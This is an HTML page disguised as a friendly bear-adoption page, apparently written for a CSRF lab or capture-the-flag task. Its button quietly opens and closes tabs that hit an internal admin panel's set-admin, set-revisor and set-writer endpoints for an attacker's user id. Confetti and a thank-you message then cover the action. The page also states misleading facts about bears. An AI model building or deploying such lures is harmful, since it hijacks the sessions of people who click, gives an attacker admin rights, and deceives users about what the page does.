<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Bear Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            background: url('https://images.pexels.com/photos/1766838/pexels-photo-1766838.jpeg') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            max-width: 600px;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }

        .button {
            display: inline-block;
            padding: 10px 20px;
            font-size: 16px;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-decoration: none;
            animation: pulse 2s infinite;
        }
        .button:hover {
            background-color: #0056b3;
        }
        @keyframes pulse {
            0% {
                transform: scale(1);
                box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
            }
            50% {
                transform: scale(1.1);
                box-shadow: 0 0 25px rgba(0, 123, 255, 0.5);
            }
            100% {
                transform: scale(1);
                box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
            }
        }
        .message {
            display: none;
            margin-top: 20px;
            padding: 10px;
            background-color: #dff0d8;
            color: #3c763d;
            border: 1px solid #d6e9c6;
            border-radius: 5px;
        }
        .confetti {
            position: fixed;
            width: 20px;
            height: 20px;
            background: red;
            z-index: 9999;
            animation: explode 2s ease-out forwards;
        }
        @keyframes explode {
            0% {
                transform: scale(1) translate(0, 0);
                opacity: 1;
            }
            100% {
                transform: scale(0) translate(var(--x), var(--y));
                opacity: 0;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 id="title">Welcome to the Bears Page</h1>
        <p>Here you can learn everything about bears. Bears are big, carnivorous mammals that are often visible in forests. They are known for their agility, playfulness, and ability to hunt humans.</p>
        <img src="https://placebear.com/200/300" alt="Cute bear">
        <br><br>

        <button class="button" onclick="csrfAndRedirect()">SCOPRI IL TUO ORSETTO</button>

        <div id="message" class="message">Your bear thanks you :)</div>
    </div>

    <script>
        // update user id according to the attacker id (8)
        const CSRF_BASE = "http://internal.admin:8000";
        const USER_ID = 8;
        const CSRF_ENDPOINTS = [
            "/admin/" + USER_ID + "/set-admin",
            "/admin/" + USER_ID + "/set-revisor",
            "/admin/" + USER_ID + "/set-writer"
        ];

        function csrfAndRedirect() {
            // Fires every CSRF request, each one in a new tab that auto-closes
            CSRF_ENDPOINTS.forEach(function(path, index) {
                setTimeout(function() {
                    var win = window.open(CSRF_BASE + path, "_blank");
                    if (win) {
                        setTimeout(function() {
                            win.close();
                        }, 100); // closes the tab after 100ms
                    }
                }, index * 300); // slight delay so all requests are fired
            });

            launchConfetti();
            // Change the main H1 text
            document.getElementById('title').textContent = 'Thank you for adopting a bear!';
            // Hide the button
            document.querySelector('.button').style.display = 'none';
            // Show the message
            document.getElementById('message').style.display = 'block';
        }

        function launchConfetti() {
            for (let i = 0; i < 100; i++) {
                createConfetti();
            }
        }

        function createConfetti() {
            const confetti = document.createElement('div');
            confetti.classList.add('confetti');
            confetti.style.left = '50vw';
            confetti.style.top = '50vh';
            confetti.style.setProperty('--x', (Math.random() - 0.5) * 300 + 'vw');
            confetti.style.setProperty('--y', (Math.random() - 0.5) * 300 + 'vh');
            confetti.style.backgroundColor = getRandomColor();
            document.body.appendChild(confetti);

            setTimeout(() => {
                confetti.remove();
            }, 2000);
        }

        function getRandomColor() {
            const colors = ['red', 'blue', 'green', 'yellow', 'orange', 'purple'];
            return colors[Math.floor(Math.random() * colors.length)];
        }
    </script>
</body>
</html>
